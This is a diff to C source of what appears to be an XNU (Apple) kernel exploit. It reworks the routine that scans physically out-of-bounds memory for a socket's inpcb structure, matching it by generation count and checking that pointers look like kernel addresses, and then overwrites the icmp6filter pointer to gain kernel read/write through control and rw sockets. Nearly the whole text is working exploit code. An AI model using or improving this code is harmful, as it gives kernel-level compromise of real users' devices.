@@ -121,20 +121,6 @@ static void pe_log(const char *fmt, ...) {
 #define uwrite64(a, v)  (*(volatile uint64_t *)(uintptr_t)(a) = (uint64_t)(v))
 #define uread64(a)      (*(volatile uint64_t *)(uintptr_t)(a))
 
-static void *reverse_memmem(const void *haystack, size_t haystack_len, const void *needle, size_t needle_len) {
-    if (needle_len == 0) return (void *)haystack;
-    if (haystack_len < needle_len) return NULL;
-
-    const char *h = (const char *)haystack;
-    const char *n = (const char *)needle;
-    for (size_t i = haystack_len - needle_len + 1; i-- > 0;) {
-        if (memcmp(h + i, n, needle_len) == 0) {
-            return (void *)(h + i);
-        }
-    }
-    return NULL;
-}
-
 static void cmp8_wait_for_change(volatile uint64_t *ptr, uint64_t old_val) {
     while (*ptr == old_val) ;
 }
@@ -182,8 +168,6 @@ static size_t process_marker_count = 0;
 static char guest_executable_name[PROCESS_MARKER_MAX_LEN];
 static char kernel_process_name[PROCESS_MARKER_MAX_LEN];
 static char host_executable_name[PROCESS_MARKER_MAX_LEN];
-
-static double g_lastprogress = 0.0;
 
 static inline void ds_progresssafe(double p) {
     ds_progress(p);
@@ -686,161 +670,121 @@ static void sockets_release(void) {
     socket_ports_count = 0;
 }
 
+static bool is_kernel_address_sane(uint64_t addr) {
+    if (addr == 0 || addr == 0xFFFFFFFFFFFFFFFFULL) return false;
+    uint16_t top_bits = (addr >> 48) & 0xFFFF;
+    if (top_bits != 0xFFFF && top_bits != 0xFFFE) return false;
+    if ((addr & 0x7) != 0) return false; // 8-byte aligned
+    return true;
+}
+
+static bool validate_candidate_pcb(uint8_t *buf, uint64_t pcb_off, uint64_t target_gencnt) {
+    uint64_t gencnt = *(uint64_t *)(buf + pcb_off + off_inpcb_inp_gencnt);
+    if (gencnt != target_gencnt) return false;
+    uint64_t le_next = *(uint64_t *)(buf + pcb_off + off_inpcb_inp_list_le_next);
+    if (!is_kernel_address_sane(le_next)) return false;
+    uint64_t le_prev = *(uint64_t *)(buf + pcb_off + off_inpcb_inp_list_le_next + 8);
+    if (!is_kernel_address_sane(le_prev)) return false;
+    uint64_t pcbinfo = *(uint64_t *)(buf + pcb_off + off_inpcb_inp_pcbinfo);
+    if (!is_kernel_address_sane(pcbinfo)) return false;
+    uint64_t sock = *(uint64_t *)(buf + pcb_off + off_inpcb_inp_socket);
+    if (sock != 0 && !is_kernel_address_sane(sock)) return false;
+    return true;
+}
+
+static bool find_pcb_by_gencnt(uint8_t *buf, uint64_t *out_pcb_off, int64_t *out_socket_idx) {
+    for (uint64_t off = 0; off <= oob_size - 8; off += 8) {
+        uint64_t val = *(uint64_t *)(buf + off);
+        if (val == 0) continue;
+        for (uint64_t i = 0; i < socket_ports_count; i++) {
+            if (socket_pcb_ids[i] == val) {
+                if (off < off_inpcb_inp_gencnt) continue;
+                uint64_t candidate = off - off_inpcb_inp_gencnt;
+                uint64_t pcb_end = candidate + off_inpcb_inp_gencnt + 8;
+                if (pcb_end > oob_size) continue;
+                if (validate_candidate_pcb(buf, candidate, val)) {
+                    *out_pcb_off = candidate;
+                    *out_socket_idx = (int64_t)i;
+                    return true;
+                }
+                break;
+            }
+        }
+    }
+    return false;
+}
+
 static int64_t find_and_corrupt_socket(mach_port_t memory_object, uint64_t seeking_offset,
                                         void *read_buffer, void *write_buffer,
                                         bool do_read) {
     if (do_read) physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
 
-    bool target_found = false;
     uint64_t pcb_start_offset = 0;
+    int64_t control_socket_idx = -1;
     uint64_t icmp6filt_offset = off_inpcb_inp_depend6_inp6_icmp6filt;
-    uint64_t corrupted_filter_marker = 0x0000ffffffffffffULL;
-    const char *matched_marker = NULL;
 
-    for (uint64_t search_start_idx = 0; search_start_idx < oob_size;) {
-        // ---- progress 0.51 → 0.59 stable scan phase ----
-        static uint64_t last_progress_step = 0;
-
-        uint64_t steps_total = oob_size / 0x400;
-        uint64_t step = search_start_idx / 0x400;
-
-        // clamp + monotonic guarantee
-        if (step > steps_total) step = steps_total;
-
-        double t = (double)step / (double)steps_total;
-        double stage_progress = 0.51 + (t * 0.08);
-
-        // only update if it actually moved forward meaningfully
-        uint64_t progress_bucket = (uint64_t)(stage_progress * 1000);
-
-        if (progress_bucket > last_progress_step) {
-            last_progress_step = progress_bucket;
-            ds_progresssafe(stage_progress);
-        }
-        
-        void *best_found = NULL;
-        const char *best_marker = NULL;
-
-        for (size_t marker_idx = 0; marker_idx < process_marker_count; marker_idx++) {
-            const char *marker = process_markers[marker_idx];
-            size_t marker_length = strnlen(marker, PROCESS_MARKER_MAX_LEN);
-            if (marker_length == 0) {
-                continue;
-            }
-
-            void *candidate = memmem((uint8_t *)read_buffer + search_start_idx, oob_size - search_start_idx, marker, marker_length);
-            if (candidate && (!best_found || candidate < best_found)) {
-                best_found = candidate;
-                best_marker = marker;
-            }
-        }
-
-        if (!best_found) {
-            break;
-        }
-
-        uint64_t found_offset = (uint8_t *)best_found - (uint8_t *)read_buffer;
-        void *filter_found = reverse_memmem(read_buffer, found_offset, &corrupted_filter_marker, sizeof(corrupted_filter_marker));
-        if (filter_found != NULL) {
-            uint64_t filter_offset = (uint8_t *)filter_found - (uint8_t *)read_buffer;
-            if (filter_offset >= icmp6filt_offset + 0x8) {
-                uint64_t candidate_pcb_start_offset = filter_offset - (icmp6filt_offset + 0x8);
-                if (candidate_pcb_start_offset + icmp6filt_offset + 0x10 <= oob_size) {
-                    pcb_start_offset = candidate_pcb_start_offset;
-                    matched_marker = best_marker;
-                    target_found = true;
-                    break;
-                }
-            }
-        }
-
-        search_start_idx = found_offset + 1;
+    if (!find_pcb_by_gencnt((uint8_t *)read_buffer, &pcb_start_offset, &control_socket_idx)) {
+        return -1;
     }
 
-    if (target_found) {
-        if (matched_marker) {
-            pe_log("matched PCB via process marker: %s", matched_marker);
-        }
-        pe_log("pcb_start_offset: 0x%llx", pcb_start_offset);
-        uint64_t target_inp_gencnt = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + 0x78);
-        pe_log("target_inp_gencnt: 0x%llx", target_inp_gencnt);
+    uint64_t target_inp_gencnt = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + off_inpcb_inp_gencnt);
+    pe_log("pcb_start_offset: 0x%llx target_inp_gencnt: 0x%llx control_socket_idx: 0x%llx",
+           pcb_start_offset, target_inp_gencnt, (uint64_t)control_socket_idx);
 
-        if (target_inp_gencnt == socket_pcb_ids[socket_ports_count - 1]) {
-            pe_log("found last PCB");
+    if (target_inp_gencnt == socket_pcb_ids[socket_ports_count - 1]) {
+        pe_log("found last PCB");
+        return -1;
+    }
+
+    for (int i = 0; i < target_inp_gencnt_count; i++) {
+        if (target_inp_gencnt_list[i] == target_inp_gencnt) {
+            pe_log("found old PCB page!");
             return -1;
         }
+    }
+    target_inp_gencnt_list[target_inp_gencnt_count++] = target_inp_gencnt;
 
-        bool is_our_pcb = false;
-        int64_t control_socket_idx = -1;
-        for (uint64_t sock_idx = 0; sock_idx < socket_ports_count; sock_idx++) {
-            if (socket_pcb_ids[sock_idx] == target_inp_gencnt) {
-                is_our_pcb = true;
-                control_socket_idx = (int64_t)sock_idx;
-                break;
-            }
+    uint64_t inp_list_next_pointer = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + off_inpcb_inp_list_le_next + 0x8) - off_inpcb_inp_list_le_next;
+    uint64_t icmp6filter = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + icmp6filt_offset);
+    pe_log("inp_list_next_pointer: 0x%llx icmp6filter: 0x%llx", inp_list_next_pointer, icmp6filter);
+
+    rw_socket_pcb = inp_list_next_pointer;
+
+    memcpy(write_buffer, read_buffer, oob_size);
+    *(uint64_t *)((uint8_t *)write_buffer + pcb_start_offset + icmp6filt_offset) = inp_list_next_pointer + icmp6filt_offset;
+    *(uint64_t *)((uint8_t *)write_buffer + pcb_start_offset + icmp6filt_offset + 8) = 0;
+
+    uint64_t corrupt_attempt = 0;
+    while (true) {
+        if (corrupt_attempt < 8 || (corrupt_attempt % 16) == 0) {
+            pe_log("corrupt attempt %llu: write target=0x%llx value=0x%llx",
+                   corrupt_attempt,
+                   (uint64_t)(seeking_offset + oob_offset + pcb_start_offset + icmp6filt_offset),
+                   inp_list_next_pointer + icmp6filt_offset);
         }
-        if (!is_our_pcb) { pe_log("found freed PCB page!"); return -1; }
-
-        for (int i = 0; i < target_inp_gencnt_count; i++) {
-            if (target_inp_gencnt_list[i] == target_inp_gencnt) {
-                pe_log("found old PCB page!");
-                return -1;
-            }
+        physical_oob_write_mo(memory_object, seeking_offset, oob_size, oob_offset, write_buffer);
+        physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
+        uint64_t new_icmp6filter = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + icmp6filt_offset);
+        if (new_icmp6filter == inp_list_next_pointer + icmp6filt_offset) {
+            pe_log("target corrupted: 0x%llx (attempt %llu)", new_icmp6filter, corrupt_attempt);
+            break;
         }
-        target_inp_gencnt_list[target_inp_gencnt_count++] = target_inp_gencnt;
+        corrupt_attempt++;
+    }
 
-        uint64_t inp_list_next_pointer = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + off_inpcb_inp_list_le_next + 0x8) - off_inpcb_inp_list_le_next;
-        uint64_t icmp6filter = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + icmp6filt_offset);
-        pe_log("inp_list_next_pointer: 0x%llx", inp_list_next_pointer);
-        pe_log("icmp6filter: 0x%llx", icmp6filter);
+    int sock = fileport_makefd(socket_ports[control_socket_idx]);
+    socklen_t gl = (socklen_t)getsockopt_read_length;
+    int res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockopt_read_data, &gl);
+    if (res != 0) { pe_log("getsockopt failed (corrupt check)!"); return -1; }
 
-        rw_socket_pcb = inp_list_next_pointer;
-
-        memcpy(write_buffer, read_buffer, oob_size);
-        *(uint64_t *)((uint8_t *)write_buffer + pcb_start_offset + icmp6filt_offset) = inp_list_next_pointer + icmp6filt_offset;
-        *(uint64_t *)((uint8_t *)write_buffer + pcb_start_offset + icmp6filt_offset + 8) = 0;
-
-        pe_log("corrupting icmp6filter pointer...");
-        uint64_t corrupt_attempt = 0;
-        while (true) {
-            if (corrupt_attempt < 8 || (corrupt_attempt % 16) == 0) {
-                pe_log("corrupt attempt %llu: write target=0x%llx value=0x%llx",
-                       corrupt_attempt,
-                       (uint64_t)(seeking_offset + oob_offset + pcb_start_offset + icmp6filt_offset),
-                       inp_list_next_pointer + icmp6filt_offset);
-            }
-            physical_oob_write_mo(memory_object, seeking_offset, oob_size, oob_offset, write_buffer);
-            if (corrupt_attempt < 8 || (corrupt_attempt % 16) == 0) {
-                pe_log("corrupt attempt %llu: write returned", corrupt_attempt);
-            }
-            physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
-            uint64_t new_icmp6filter = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + icmp6filt_offset);
-            if (corrupt_attempt < 8 || (corrupt_attempt % 16) == 0) {
-                pe_log("corrupt attempt %llu: read new_icmp6filter=0x%llx",
-                       corrupt_attempt,
-                       new_icmp6filter);
-            }
-            if (new_icmp6filter == inp_list_next_pointer + icmp6filt_offset) {
-                pe_log("target corrupted: 0x%llx", new_icmp6filter);
-                break;
-            }
-            corrupt_attempt++;
-        }
-
-        int sock = fileport_makefd(socket_ports[control_socket_idx]);
-        socklen_t gl = (socklen_t)getsockopt_read_length;
-        int res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockopt_read_data, &gl);
-        if (res != 0) { pe_log("getsockopt failed (corrupt check)!"); return -1; }
-
-        uint64_t marker = *(uint64_t *)getsockopt_read_data;
-        if (marker != 0xffffffffffffffffULL) {
-            pe_log("found control_socket at idx: 0x%llx", (uint64_t)control_socket_idx);
-            control_socket = sock;
-            rw_socket = fileport_makefd(socket_ports[control_socket_idx + 1]);
-            return KERN_SUCCESS;
-        } else {
-            pe_log("failed to corrupt control_socket at idx: 0x%llx", (uint64_t)control_socket_idx);
-        }
+    uint64_t marker = *(uint64_t *)getsockopt_read_data;
+    if (marker != 0xffffffffffffffffULL) {
+        pe_log("found control_socket at idx: 0x%llx", (uint64_t)control_socket_idx);
+        control_socket = sock;
+        rw_socket = fileport_makefd(socket_ports[control_socket_idx + 1]);
+        return KERN_SUCCESS;
+    } else {
+        pe_log("failed to corrupt control_socket at idx: 0x%llx", (uint64_t)control_socket_idx);
     }
     return -1;
 }
@@ -961,7 +905,6 @@ static void pe_v1(void) {
         pe_log("end_pcb_id: 0x%llx", end_pcb_id);
 
         bool success = false;
-        uint64_t total_mappings = n_of_search_mappings;
         for (uint64_t s = 0; s < n_of_search_mappings; s++) {
             mach_vm_address_t search_mapping_address = search_mappings[s];
 
